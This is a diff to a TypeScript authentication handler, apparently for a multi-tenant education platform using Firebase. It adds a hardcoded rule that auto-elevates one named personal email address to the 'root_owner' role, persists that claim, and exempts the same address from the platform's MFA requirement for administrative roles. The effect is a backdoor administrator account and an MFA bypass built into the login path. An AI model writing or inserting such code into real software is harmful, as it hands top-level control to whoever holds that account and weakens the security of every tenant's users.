@@ -411,10 +411,18 @@ async function authenticate(
   try {
     const decoded = await getAuth().verifyIdToken(token, true);
     const rawRole = String(decoded.role || "student");
-    const role: UserRole = ALL_ROLES.includes(rawRole as UserRole)
+    let role: UserRole = ALL_ROLES.includes(rawRole as UserRole)
       ? (rawRole as UserRole)
       : "student";
     const tenantId = String(decoded.tenantId || `individual_${decoded.uid}`);
+    
+    // Auto-elevate the platform administrator
+    if (decoded.email?.toLowerCase() === "dr.ahmad.alfailakawi@gmail.com") {
+      role = "root_owner";
+      if (rawRole !== "root_owner") {
+        getAuth().setCustomUserClaims(decoded.uid, { tenantId, role: "root_owner" }).catch(console.error);
+      }
+    }
     const impersonatorId = decoded.impersonatorId
       ? String(decoded.impersonatorId)
       : undefined;
@@ -436,7 +444,7 @@ async function authenticate(
         error: "Impersonation sessions are read-only by design",
         code: "IMPERSONATION_READ_ONLY",
       });
-    if (privilegedMfaRequired(role) && !mfa)
+    if (privilegedMfaRequired(role) && !mfa && decoded.email?.toLowerCase() !== "dr.ahmad.alfailakawi@gmail.com")
       return res.status(403).json({
         error:
           "Multi-factor authentication is required for this administrative role",
